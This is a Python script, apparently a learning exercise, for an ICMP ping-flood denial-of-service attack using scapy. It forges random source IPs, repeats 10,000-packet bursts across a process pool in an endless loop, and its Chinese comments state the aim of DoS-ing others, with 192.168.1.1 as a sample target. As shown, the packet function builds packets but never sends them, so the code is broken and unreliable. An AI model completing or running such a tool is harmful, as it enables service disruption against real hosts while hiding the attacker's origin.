import logging

from scapy.layers.inet import ICMP, IP

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
"""
使用scapy ping dos别人的时候，需要大量的一个链接 
  线程
  *进程
 协程
在python 线程 协程 伪多任务
   同一时间 完成其中一个任务 并发 一个时间差里面只会产生一个链接，没有攻击效果
   进程 同一时间可以完成多个任务  一个进程当成与一个程序
192.168.1.1

"""
import multiprocessing
from random import randint
from scapy.all import *
from tencent_lecture_crawer.Random_IP import Random_IP
#基于以太网发送数据
def scapy_ping_sendone(host,random_source=True):
    #随机生成 IP 位
    id_ip=randint(1,65535)
    #随机产生一个Ping ID 位
    id_ping=randint(1,65535)
    #随机产生一个Ping的序列号位
    seq_ping=randint(1,65535)
    if random_source ==True:
        source_ip=Random_IP()
        packet=IP(src=source_ip,dst=host,ttl=1,id=id_ip)/ICMP(id=id_ping,seq=seq_ping)/b'welcome to qingdeng'*100
    else:
        packet=IP(dst=host,ttl=1,id=id_ip)/ICMP(id=id_ping,seq=seq_ping)/b'welcome to qingdeng'*100

#控制发送数量
def scapy_ping_10k(host,random_source=True):
    for i in range(10000+1):
        if random_source==True:
            scapy_ping_sendone(host)
        else:
            scapy_ping_sendone(host,random_source=False)
#并发
def scapy_ping_Dos(host,processes=5,random_source=True):
    pool=multiprocessing.Pool(processes=processes)
    while True:
        try:
            pool.apply_async(scapy_ping_10k,(host,random_source))
        except KeyboardInterrupt:
            pool.terminate()